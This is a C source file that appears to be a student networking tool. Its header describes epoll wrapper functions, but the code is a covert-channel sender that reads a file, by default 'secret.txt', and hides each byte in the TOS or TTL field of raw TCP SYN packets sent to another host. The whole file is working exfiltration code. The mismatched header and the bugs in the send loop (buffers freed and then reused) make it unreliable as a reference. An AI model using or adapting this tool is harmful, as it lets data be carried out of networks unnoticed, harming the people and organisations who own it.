/***********************************************************
* SOURCE FILE: epoll.cpp
*
* PROGRAM: PortForwarder
*
* FUNCTIONS:
* int Epoll_create(int queue);
* int Epoll_ctl(int epfd, int op, int sockfd, struct epoll_event *event);
* int Epoll_wait(int epollfd, struct epoll_event *event, int queue, int timeout);
*
* DATE: MARCH 11, 2012
*
* DESIGNER: Karl Castillo
*
* PROGRAMMER: Karl Castillo
*
* NOTES:
* Contains wrapper functions for the Linux ePoll API.
***********************************************************/

/* INCLUDES */
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <linux/ip.h>

/* DEFINES */
#define VERSION         "1.0"
#define TOS             1
#define TTL             2
#define DEF_SPORT       8000
#define DEF_DPORT       8000
#define DEF_SIP         "192.168.1.71"
#define DEF_DIP         "192.168.1.71"
#define DEF_FIL         "secret.txt"

/* STRUCTURES */
typedef struct sendhdr {
        struct iphdr ip;
        struct tcphdr tcp;
} SENDHDR, *PSENDHDR;

typedef struct pseudo_header {
      unsigned int source_address;
      unsigned int dest_address;
      unsigned char placeholder;
      unsigned char protocol;
      unsigned short tcp_length;
      struct tcphdr tcp;
} PSEUDOHDR, *PPSEUDOHDR;

/* PROTOTYPES */
unsigned int ip_convert(char *hostname);
unsigned short in_cksum(unsigned short *ptr, int nbytes);
void doEncode(unsigned int source_ip, unsigned int dest_ip, unsigned short
        source_port, unsigned short dest_port, char *filename, int option);
struct iphdr createIphdr(unsigned int source_ip, unsigned int dest_ip, int tpye,
        char c);
struct tcphdr createTcphdr(unsigned short source_port, unsigned short dest_port);

int main(int argc, char* argv[])
{
        unsigned int source_ip = 0;
        unsigned int dest_ip = 0;
        unsigned short source_port = DEF_SPORT;
        unsigned short dest_port = DEF_DPORT;
        int encoding_type = 0;
        int option = 0;
        char destIp[80] = DEF_DIP;
        char sourceIp[80] = DEF_SIP;
        char file_name[80] = DEF_FIL;
        
        if(getuid() != 0) {
                printf("\nYou must run this in root!\n");
                return 1;
        }
        
        while((option = getopt(argc, argv, ":S:D:s:d:f:tl")) != -1) {
                switch(option) {
                case 'S': /* source IP */
                        source_ip = ip_convert(optarg);
                        strncpy(sourceIp, optarg, 79);
                        break;
                case 'D': /* destination IP */
                        dest_ip = ip_convert(optarg);
                        strncpy(destIp, optarg, 79);
                        break;
                case 's': /* source port */
                        source_port = atoi(optarg);
                        break;
                case 'd': /* destination port */
                        dest_port = atoi(optarg);
                        break;
                case 't': /* tos */
                        encoding_type = TOS;
                        break;
                case 'l': /* ttl */
                        encoding_type = TTL;
                        break;
                case 'f': /* file name */
                        strncpy(file_name, optarg, 79);
                        break;
                }
        }
        
        if(encoding_type == 0) {
                perror("Please select an encoding type.\n");
                return 2;
        }
        
        printf("Type: %d\n", encoding_type);
        
        doEncode(source_ip, dest_ip, source_port, dest_port, file_name, 
                encoding_type);
        
        return 0;
}

void doEncode(unsigned int source_ip, unsigned int dest_ip, unsigned short
        source_port, unsigned short dest_port, char *file_name, int type)
{
        PSENDHDR sendhdr = (PSENDHDR)malloc(sizeof(SENDHDR));
        PPSEUDOHDR pseudohdr = (PPSEUDOHDR)malloc(sizeof(PSEUDOHDR));
        int c;
        int sock;
        struct sockaddr_in sin;
        FILE *file;
        
        if((file = fopen(file_name, "rb")) == NULL) {
                fprintf(stderr, "Cannot open %s\n", file_name);
                exit(4);
        }
        
        if((sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
                perror("Cannot create socket");
                exit(EXIT_FAILURE);
        }
        
        while((c = fgetc(file)) != EOF) {
                sleep(1);
                
                sendhdr->ip = createIphdr(source_ip, dest_ip, type, c);
                sendhdr->tcp = createTcphdr(source_port, dest_port);
                
                sin.sin_family = AF_INET;
                sin.sin_port = sendhdr->tcp.source;
                sin.sin_addr.s_addr = sendhdr->ip.daddr;
                
                sendhdr->ip.check = in_cksum((unsigned short*)&sendhdr->ip, 20);
                
                pseudohdr->source_address = sendhdr->ip.saddr;
                pseudohdr->dest_address = sendhdr->ip.daddr;
                pseudohdr->placeholder = 0;
                pseudohdr->protocol = IPPROTO_TCP;
                pseudohdr->tcp_length = htons(20);
                
                bcopy((char*)&sendhdr->tcp, (char*)&pseudohdr->tcp, 20);
                
                sendhdr->tcp.check = in_cksum((unsigned short*)pseudohdr, 32);
                
                sendto(sock, sendhdr, 40, 0, (struct sockaddr *)&sin, sizeof(sin));
                
                free(sendhdr);
                free(pseudohdr);
        }
        close(sock);
        fclose(file);
}

struct iphdr createIphdr(unsigned int source_ip, unsigned int dest_ip, int type,
        char c)
{   
        struct iphdr ip;
        srand((getpid())*(dest_ip)); 
        
        ip.ihl = 5;
        ip.version = 4;
        if(type == TOS) {
                ip.tos = c;
        } else {
                ip.tos = 0;
        }
        ip.tot_len = htons(40);
        ip.id = (int)(255.0 * rand() / (RAND_MAX + 1.0));
        ip.frag_off = 0;
        if(type == TTL) {
                ip.ttl = 64 + c;
        } else {
                ip.ttl = 64;
        }
        ip.protocol = IPPROTO_TCP;
        ip.check = 0;
        ip.saddr = source_ip;
        ip.daddr = dest_ip;
        
        return ip;
}

struct tcphdr createTcphdr(unsigned short source_port, unsigned short dest_port)
{
        struct tcphdr tcp;
        srand((getpid())*(dest_port)); 
        
        tcp.source = htons(source_port);
        tcp.seq = 1 + (int)(10000.0 * rand() / (RAND_MAX + 1.0));
        tcp.dest = htons(dest_port);
        
        tcp.ack_seq = 0;
        tcp.res1 = 0;
        tcp.doff = 5;
        tcp.fin = 0;
        tcp.syn = 1;
        tcp.rst = 0;
        tcp.psh = 0;
        tcp.ack = 0;
        tcp.urg = 0;
        tcp.res2 = 0;
        tcp.window = htons(512);
        tcp.check = 0;
        tcp.urg_ptr = 0;
        
        return tcp;
}

unsigned short in_cksum(unsigned short *ptr, int nbytes)
{
	register long sum;
	u_short oddbyte;
	register u_short answer;

	/*
	 * Our algorithm is simple, using a 32-bit accumulator (sum),
	 * we add sequential 16-bit words to it, and at the end, fold back
	 * all the carry bits from the top 16 bits into the lower 16 bits.
	 */

	sum = 0;
	while (nbytes > 1)  {
		sum += *ptr++;
		nbytes -= 2;
	}

	/* mop up an odd byte, if necessary */
	if (nbytes == 1) {
		oddbyte = 0; /* make sure top half is zero */
		*((u_char *) &oddbyte) = *(u_char *)ptr; /* one byte only */
		sum += oddbyte;
	}

	/*
	 * Add back carry outs from top 16 bits to low 16 bits.
	 */

	sum  = (sum >> 16) + (sum & 0xffff); /* add high-16 to low-16 */
	sum += (sum >> 16); /* add carry */
	answer = ~sum; /* ones-complement, then truncate to 16 bits */
	
	return(answer);
}

unsigned int ip_convert(char *hostname)
{
        static struct in_addr inaddr;
        struct hostent *host;
        
        if((inaddr.s_addr = inet_addr(hostname)) == 0) {
                if((host = gethostbyname(hostname)) == NULL) {
                        fprintf(stderr, "Cannot resolve %s\n", hostname);
                        exit(3);
                }
                bcopy(host->h_addr, (char*)&inaddr.s_addr, host->h_length);
        }
        return inaddr.s_addr;
}
